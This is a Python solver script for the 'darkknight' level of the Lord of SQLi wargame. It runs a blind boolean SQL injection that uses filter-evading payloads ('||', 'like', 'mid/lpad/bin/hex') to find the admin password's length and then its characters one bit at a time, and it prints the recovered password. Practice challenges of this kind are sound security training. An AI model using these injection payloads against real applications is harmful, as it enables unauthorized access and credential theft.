import requests

def get(pw, no):
    return requests.get(
        'https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php',
        params={"pw":pw, 'no': no},
        cookies={'PHPSESSID': 'noefrhpr1bme4kn0b510mjnq01'}).text

# get length
length = 1
while True:
    print("Try length", length)
    if "<h2>Hello admin</h2>" in get('', f'9999||id like "admin"&&length(pw) like {length} -- -'):
        break
    length += 1
print("Length is", length)

# get password
password = ''
for index in range(1, length + 1):
    tmp = ''
    for bit in range(1, 8):
        if "<h2>Hello admin</h2>" in get('', f'9999||id like "admin"&&mid(lpad(bin(hex(mid(pw,{index},1))),7,0),{bit},1) -- -'):
           tmp += '1'
        else:
            tmp += '0'
    password += chr(int(str(int(tmp, 2)), 16))
    print(password)

# password is 0b70ea1f

# certify
print(get(password, ''))